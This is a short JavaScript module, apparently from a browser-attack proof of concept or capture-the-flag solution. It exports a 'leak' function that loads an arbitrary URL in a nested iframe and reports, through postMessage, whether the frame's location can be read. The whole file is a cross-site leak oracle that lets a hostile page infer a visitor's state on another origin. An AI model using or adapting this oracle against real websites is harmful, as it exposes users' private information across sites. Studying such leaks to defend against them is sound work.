const leak = async (url) => {
    return new Promise(r => {
        let iframe = document.createElement('iframe')

        window.onmessage = (e) => {
            iframe.remove()
            return r(e.data)
        }
        
        iframe.srcdoc = `
            <iframe id="frame" src="${url}"></iframe>
            <script>
                window.onload = () => {
                    try{
                        // is it about:blank?
                        frame.contentWindow.location.href
                        parent.postMessage(1,'*');
                    }catch(e){
                        parent.postMessage(0,'*');
                    }
                }
            <\/script>`
        document.body.appendChild(iframe)


    })
}


export {leak}